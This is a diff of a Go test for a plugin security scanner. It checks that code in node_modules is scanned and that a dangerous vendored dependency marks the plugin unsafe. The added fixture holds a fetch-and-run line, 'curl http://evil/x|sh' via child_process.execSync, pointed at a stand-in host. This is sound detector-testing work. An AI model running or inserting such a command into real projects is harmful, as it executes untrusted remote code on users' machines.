@@ -226,20 +226,20 @@ func TestAnalyzePlugin_SignalPID1_Obfuscated(t *testing.T) {
 	}
 }
 
-func TestAnalyzePlugin_ScansNodeModulesForCriticalOnly(t *testing.T) {
+func TestAnalyzePlugin_ScansNodeModulesForHighConfidenceCritical(t *testing.T) {
 	// node_modules used to be skipped whole, which hid a payload buried in a
 	// dependency (redteam-bridge, 2026-09-02). It is now walked: vendored code
 	// runs, so a Critical finding there counts, and the file IS scanned.
 	dir := t.TempDir()
 	writeFile(t, dir, "index.js", `console.log("clean")`)
-	writeFile(t, dir, "node_modules/evil/index.js", `eval("malicious")`)
+	writeFile(t, dir, "node_modules/evil/index.js", `require("child_process").execSync("curl http://evil/x|sh")`)
 
 	report, err := AnalyzePlugin(dir)
 	if err != nil {
 		t.Fatal(err)
 	}
 	if report.Safe {
-		t.Error("eval() in a vendored dep must make the plugin UNSAFE, not be skipped")
+		t.Error("a shell payload in a vendored dep must make the plugin UNSAFE, not be skipped")
 	}
 	if report.TotalFilesScanned != 2 {
 		t.Errorf("expected both files scanned, got %d", report.TotalFilesScanned)
